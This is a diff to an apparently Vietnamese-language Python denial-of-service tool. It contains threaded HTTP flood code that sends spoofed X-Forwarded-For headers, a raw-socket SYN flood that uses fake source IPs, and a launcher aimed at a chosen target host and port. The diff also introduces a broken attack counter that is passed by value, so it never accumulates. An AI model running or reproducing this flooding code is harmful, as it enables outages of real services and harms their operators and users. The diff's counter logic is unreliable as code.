@@ -5,14 +5,9 @@ import requests
 from urllib.parse import urlparse
 from colorama import Fore, Style
 from socket import *
-from struct import pack
+from struct import pack, htons
 from random import randrange, choice, randint
-import signal
-import string
-
-# Tạo một lock để đồng bộ hóa việc truy cập vào biến attack_num
-attack_num_lock = threading.Lock()
-attack_num = 0
+import re
 
 def fake_ip():
     while True:
@@ -20,11 +15,17 @@ def fake_ip():
         if ips[0] == "127":
             continue
         fkip = '.'.join(ips)
-        break
-    return fkip
+        if is_valid_ip(fkip):
+            return fkip
 
-def ddos_requester(target_host, target_port, target_path, fake_ip):
-    global attack_num
+def is_valid_ip(ip):
+    # Kiểm tra địa chỉ IP có phải là IPv4 hợp lệ không
+    pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
+    if pattern.match(ip):
+        return all(0 <= int(part) <= 255 for part in ip.split('.'))
+    return False
+
+def ddos_requester(target_host, target_port, target_path, fake_ip, attack_num):
     headers = {
         'Host': target_host,
         'X-Forwarded-For': fake_ip,
@@ -36,8 +37,7 @@ def ddos_requester(target_host, target_port, target_path, fake_ip):
     while True:
         try:
             response = requests.get(f"http://{target_host}:{target_port}{target_path}", headers=headers)
-            with attack_num_lock:
-                attack_num += 1
+            attack_num += 1
             print(f"Gói tin đã gửi! Số lần tấn công: {attack_num} - Mã phản hồi: {response.status_code}")
         except requests.RequestException as e:
             print(f"Lỗi: {e}")
@@ -52,6 +52,13 @@ def add_useragent():
     ]
 
 def syn_flood(tgt, port, fake_ip):
+    if not is_valid_ip(fake_ip):
+        print(f"IP giả không hợp lệ: {fake_ip}")
+        return
+    if not is_valid_ip(tgt):
+        print(f"Địa chỉ IP mục tiêu không hợp lệ: {tgt}")
+        return
+
     try:
         while True:
             ihl = 5
@@ -183,9 +190,11 @@ def ddos_with_spoofing(attack_type):
     print("giây: 1")
     time.sleep(1)
 
+    attack_num = 0
+
     if attack_type == 'requester':
         for _ in range(threads):
-            thread = threading.Thread(target=ddos_requester, args=(target_host, target_port, target_path, fake_ip))
+            thread = threading.Thread(target=ddos_requester, args=(target_host, target_port, target_path, fake_ip, attack_num))
             thread.start()
     elif attack_type == 'synflood':
         for _ in range(threads):
